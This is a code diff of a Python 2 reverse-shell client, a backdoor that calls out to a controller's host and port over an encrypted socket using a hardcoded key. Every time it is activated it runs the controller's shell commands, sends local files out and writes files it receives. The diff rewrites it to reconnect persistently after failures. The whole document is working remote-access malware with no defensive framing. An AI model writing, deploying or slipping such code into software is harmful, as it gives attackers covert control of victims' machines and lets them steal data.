@@ -1,11 +1,12 @@
-#!/usr/bin/python2.7
+#!/usr/bin/python
+import socket,os
+import sys
 import nacl.secret
 import nacl.utils
-import socket,subprocess
-import sys,os,time
+import time,os,subprocess
 
-HOST = '192.168.1.11'   # Symbolic name, meaning all available interfaces
-PORT = 8887 # Arbitrary non-privileged port
+HOST = '0.0.0.0'   # Symbolic name, meaning all available interfaces
+PORT = 8888 # Arbitrary non-privileged port
 
 # This must be kept secret, this is the combination to your safe
 key = '9SeT2kaxYlRYS675TxzHwB2el4Pa15A3'
@@ -13,70 +14,123 @@ key = '9SeT2kaxYlRYS675TxzHwB2el4Pa15A3'
 # This is your safe, you can use it to encrypt or decrypt messages
 box = nacl.secret.SecretBox(key)
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-print 'Socket created'
+# session controller
+active = False
 
-#Bind socket to local host and port
-try:
-    s.connect((HOST, PORT))
-except socket.error as msg:
-    print 'connect failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
-    sys.exit()
+# Functions
+###########
 
-print 'Socket connect complete'
+# send data function
+def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
+	sock.sendall(box.encrypt(cmd + end))
 
-#Start listening on socket
-success = box.encrypt('Hello There!EOFEOFEOFEOFEOFX')
-s.send(success)
-#now keep talking with the client
-while 1:
+# receive data function
+def Receive(sock, end="EOFEOFEOFEOFEOFX"):
+	data = ""
+	l = sock.recv(1024)
+	while(l):
 
-    data = s.recv(1024)
-    dataDec =  box.decrypt(data)
-    if dataDec == "quit":
-            break
-    elif dataDec.startswith("download") == True:
-            #set the name of the file
-            sendFile = dataDec[9:]
-            #file transfer
-            with open(sendFile, 'rb') as f:
-                while 1:
-                        fileData = f.read()
-                        if fileData == '' : break
-                        #send file
-                        s.sendall(fileData)
-            f.close()
-            time.sleep(0.8)
-            s.sendall('EOFEOFEOFEOFEOFX')
-            time.sleep(0.8)
-            s.sendall(box.encrypt('Download is finished.EOFEOFEOFEOFEOFX'))
+		decrypted = box.decrypt(l)
+		print decrypted
+		data = data + decrypted
+		if data.endswith(end) == True:
+			break
+		else:
+			l = sock.recv(1024)
 
-    elif dataDec.startswith("upload") == True:
-            #set the name of the file
-            downFile = dataDec[7:]
-            d = open(downFile, 'wb')
-            #upload the daamn file
-            while True:
-                l = conn.recv(1024)
-                while (l):
-                    if(l.endswith("EOFEOFEOFEOFEOFX")):
-                        u = l[:-16]
-                        d.write(u)
-                        break
-                    else:
-                        d.write(l)
-                        l = conn.recv(1024)
-                break
-            d.close()
-            time.sleep(0.8)
-            s.sendall(box.encrypt('Upload is finished.EOFEOFEOFEOFEOFX'))
+	return data[:-len(end)]
+
+# upload file
+def Upload(sock, filename):
+	bgtr = True
+	# file transfer
+	try:
+		f = open(filename, 'rb')
+		while 1:
+			fileData = f.read()
+			if fileData == '': break
+			# begin sending file
+			Send(sock, fileData, "")
+		f.close()
+	except:
+		time.sleep(0.1)
+	# let server know we're done..
+	time.sleep(0.8)
+	Send(sock, "")
+	time.sleep(0.8)
+	return "Finished download."
+
+# download file
+def Download(sock, filename):
+	# file transfer
+	g = open(filename, 'wb')
+	# download file
+	fileData = Receive(sock)
+	time.sleep(0.8)
+	g.write(fileData)
+	g.close()
+	# let server know we're done..
+	return "Finished upload."
+
+# main loop
+while True:
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((HOST, PORT))
 
 
+		# waiting to be activated...
+		data = Receive(s)
 
-    else:
-            proc = subprocess.Popen(dataDec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            stdoutput = proc.stdout.read() + proc.stderr.read()
-            stdoutputEnc = box.encrypt(stdoutput + 'EOFEOFEOFEOFEOFX')
-            s.send(stdoutputEnc)
+		# activate.
+		if data == 'Activate':
+			active = True
+			Send(s, "\n"+os.getcwd()+">")
 
-s.close()
+		# interactive loop
+		while active:
+
+			# Receive data
+			data = Receive(s)
+
+			# check for quit
+			if data == "quit" or data == "terminate":
+				Send(s, "quitted")
+				break
+
+			# check for change directory
+			elif data.startswith("cd ") == True:
+				os.chdir(data[3:])
+				stdoutput = ""
+
+			# check for download
+			elif data.startswith("download ") == True:
+				# Upload the file
+				stdoutput = Upload(s, data[9:])
+
+			# check for upload
+			elif data.startswith("upload ") == True:
+				# Download the file
+				stdoutput = Download(s, data[7:])
+
+			else:
+				# execute command
+				print
+				proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+				# save output/error
+				stdoutput = proc.stdout.read() + proc.stderr.read()
+
+			# send data
+			stdoutput = stdoutput+"\n"+os.getcwd()+">"
+			Send(s, stdoutput)
+
+		# loop ends here
+
+		if data == "terminate":
+			break
+		time.sleep(3)
+	except socket.error:
+		s.close()
+		time.sleep(10)
+		continue
